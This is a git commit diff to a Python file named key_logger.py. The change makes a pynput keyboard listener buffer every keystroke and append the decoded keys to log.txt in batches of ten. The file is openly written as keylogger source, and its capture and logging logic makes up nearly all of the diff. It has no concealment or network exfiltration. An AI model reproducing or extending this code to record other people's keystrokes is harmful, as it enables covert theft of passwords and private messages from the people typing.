082b51f55c0520529fb7af0a76c957caeca23bae
LittleFinchy <57785785+LittleFinchy@users.noreply.github.com>
2020-07-16 22:51:55 -0400

    write to txt file

--- key_logger.py
+++ key_logger.py
@@ -2,9 +2,30 @@ import pynput
 from pynput.keyboard import Key, Listener
 from datetime import datetime
 
+count, keys = 0, []
 
 def on_press(key):
-	print(key)
+	global keys, count
+	keys.append(key)
+	count += 1
+	
+	if count >= 10:
+		write_file(keys)
+		count, keys = 0, []
+
+
+def write_file(keys):
+	with open('log.txt', 'a') as f:
+		for key in keys:
+			k = str(key).replace("'", '')
+			if k.find('space') > 0:
+				f.write(str(' '))
+			elif k.find('Key') == -1:
+				f.write(k)
+			else:
+				f.write(' '+k[4:])
+
+    
 
 def on_release(key):
 	if key == Key.esc:
@@ -12,4 +33,4 @@ def on_release(key):
 
 
 with Listener(on_press=on_press, on_release=on_release) as listener:
-	listener.join()  fdsaf
+	listener.join()
